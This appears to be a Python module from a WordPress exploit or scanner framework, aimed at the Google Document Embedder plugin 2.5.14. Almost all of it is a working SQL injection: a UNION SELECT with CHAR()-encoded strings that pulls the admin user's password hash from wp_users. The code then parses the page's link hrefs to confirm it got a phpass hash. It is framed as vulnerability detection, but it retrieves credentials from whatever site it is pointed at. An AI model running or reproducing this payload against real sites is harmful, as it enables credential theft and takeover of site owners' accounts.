from bs4 import BeautifulSoup
from ..exploitsql import ExploitSql


class GoogleDocEmbedderSQL(ExploitSql):

	EXPLOIT_NAME = 'Google Document Embedder'
	EXPLOIT_VERSION = '2.5.14'
	EXPLOIT_URL = 'http://www.exploit-db.com/exploits/35371/'

	def exploit(self):
		name = self.EXPLOIT_NAME
		version = self.EXPLOIT_VERSION
		exploit = "/wp-content/plugins/google-document-embedder/view.php?embedded=1&gpid=0%20UNION%20SELECT%201,%202,%203," \
			"%20CONCAT(CAST(CHAR(97,%2058,%2049,%2058,%20123,%20115,%2058,%2054,%2058,%2034,%20118,%20119,%2095,%2099," \
			"%20115,%20115,%2034,%2059,%20115,%2058)%20as%20CHAR),%20LENGTH(user_pass),%20CAST(CHAR(58,%2034)%20as%20CHAR)," \
			"%20user_pass,%20CAST(CHAR(34,%2059,%20125)%20as%20CHAR))%20FROM%20`wp_users`%20WHERE%20ID=1"\

		response = self.request(self.hostname + exploit)
		if response is not None:
			soup = BeautifulSoup(response)
			links = soup.findAll('link')
			if links:
				for link in links:
					result = link.get('href')
					if len(result) == 34 and '$' in result:
						self.exploitfound(name, version, self.EXPLOIT_URL)
			else:
				self.exploitnotfound(name, version)
		else:
			self.exploitnotfound(name, version)
